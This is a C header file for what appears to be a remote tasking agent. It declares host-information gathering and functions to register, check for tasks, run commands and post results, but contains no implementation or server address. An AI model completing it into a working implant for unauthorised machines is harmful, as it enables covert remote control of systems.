#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/utsname.h>

#ifndef INITIATE_H
#define INITIATE_H

struct response {
  char *memory;
  size_t size;
};

struct agent_info {
	char *uuid;
	char *hostname;
	char *os;
	char *version;
};

struct strings_array {
	char *tasks; // was file names
	char *words; // was words
	size_t sz;
	size_t cap;
	size_t file_num;
	FILE *word_source; //was word source
};

bool reg(void);

bool check_tasks(void);

int get_host_info(struct agent_info *agent);

bool run_cmd(struct strings_array *sa);

bool can_run_cmd(const char *cmd);

bool post_results(struct strings_array *sa);



#endif